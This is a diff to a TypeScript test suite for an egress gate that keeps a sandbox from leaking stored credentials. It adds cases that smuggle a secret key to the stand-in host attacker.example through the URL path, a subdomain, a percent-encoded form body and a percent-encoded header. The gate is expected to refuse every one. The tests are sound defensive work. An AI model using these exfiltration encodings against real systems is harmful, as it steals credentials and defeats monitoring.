@@ -268,6 +268,20 @@ describe("the egress gate", () => {
 			draft(`https://elsewhere.example/v1?k=${encodeURIComponent(KEY)}`),
 			draft("https://elsewhere.example/v1", [["content-type", "application/json"]], JSON.stringify({ k: KEY }), "POST"),
 			draft("https://elsewhere.example/v1", [["authorization", `Basic ${btoa(`${KEY}:`)}`]]),
+			// In a URL's path, not glued to the host or the slashes around it.
+			draft(`https://attacker.example/${KEY}`),
+			draft(`https://attacker.example/v1/${KEY}.json`),
+			// As a host name: the host is not recorded either.
+			draft(`https://${KEY}.attacker.example/`),
+			// A form, fully percent-encoded, whatever the content type's case.
+			draft(
+				"https://attacker.example/v1",
+				[["content-type", "Application/X-Www-Form-Urlencoded"]],
+				`k=${Array.from(KEY, (c) => `%${c.charCodeAt(0).toString(16)}`).join("")}`,
+				"POST",
+			),
+			// A percent-encoded header.
+			draft("https://attacker.example/v1", [["x-token", encodeURIComponent(KEY).replaceAll("-", "%2D")]]),
 			// Even beside a good placeholder.
 			draft("https://api.example.com/v1", [
 				["authorization", connection.placeholder!],
@@ -420,11 +434,35 @@ describe("the egress gate", () => {
 			termsHash: proposal.termsHash,
 			pickedCode: proposal.bindingCode,
 		});
+		// The approval is of the request exactly as the sandbox sent it: another cookie or Authorization is not covered.
+		for (const extra of [
+			["cookie", "session=other"],
+			["x-extra", "1"],
+		] as [string, string][]) {
+			const changed = { ...post, headers: [...post.headers, extra] };
+			expect(refusalOf(await env.connections.egress(SYSTEM, SESSION, changed)).error).toBe("approval_pending");
+		}
+		expect(env.sent).toHaveLength(0);
 		const sent = await env.connections.egress(SYSTEM, SESSION, post);
 		expect(sent.kind).toBe("sent");
 		expect(env.sent[0]!.body).toBe('{"title":"hi"}');
 		// The approval was for that request once.
 		expect(refusalOf(await env.connections.egress(SYSTEM, SESSION, post)).error).toBe("approval_pending");
+	});
+
+	it("cuts the credential out of the reason phrase too", async () => {
+		const env = setup({
+			answer: (_url, init) =>
+				new Response("no", { status: 400, statusText: `Bad ${new Headers(init?.headers).get("authorization")}` }),
+		});
+		const connection = await env.connect();
+		const outcome = await env.connections.egress(
+			SYSTEM,
+			SESSION,
+			draft("https://api.example.com/v1", [["authorization", connection.placeholder!]]),
+		);
+		if (outcome.kind !== "sent") throw new Error("not sent");
+		expect(outcome.statusText).toBe("Bad [redacted]");
 	});
 
 	it("answers a redirect without following it, the credential cut out of its location", async () => {
